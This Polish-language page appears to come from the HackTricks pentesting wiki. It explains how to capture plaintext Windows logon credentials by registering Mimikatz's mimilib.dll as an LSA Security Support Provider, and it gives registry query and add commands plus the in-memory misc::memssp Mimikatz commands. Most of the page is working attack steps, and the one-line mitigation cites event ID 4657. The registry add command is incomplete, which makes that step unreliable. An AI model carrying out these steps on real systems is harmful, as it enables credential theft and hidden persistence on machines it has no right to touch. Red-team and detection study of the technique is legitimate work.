# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Dowiedz się, czym jest SSP (Security Support Provider) tutaj.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Możesz stworzyć **własny SSP**, aby **przechwycić** w **czystym tekście** **poświadczenia** używane do uzyskania dostępu do maszyny.

#### Mimilib

Możesz użyć binarnego pliku `mimilib.dll` dostarczonego przez Mimikatz. **To zapisze wszystkie poświadczenia w czystym tekście w pliku.**\
Umieść dll w `C:\Windows\System32\`\
Uzyskaj listę istniejących pakietów zabezpieczeń LSA:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Dodaj `mimilib.dll` do listy dostawców wsparcia bezpieczeństwa (Pakiety zabezpieczeń):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
A po ponownym uruchomieniu wszystkie poświadczenia można znaleźć w czystym tekście w `C:\Windows\System32\kiwissp.log`

#### W pamięci

Możesz również wstrzyknąć to bezpośrednio do pamięci za pomocą Mimikatz (zauważ, że może to być trochę niestabilne/nie działać):
```powershell
privilege::debug
misc::memssp
```
To nie przetrwa ponownego uruchomienia.

#### Łagodzenie

Identyfikator zdarzenia 4657 - Audyt utworzenia/zmiany `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
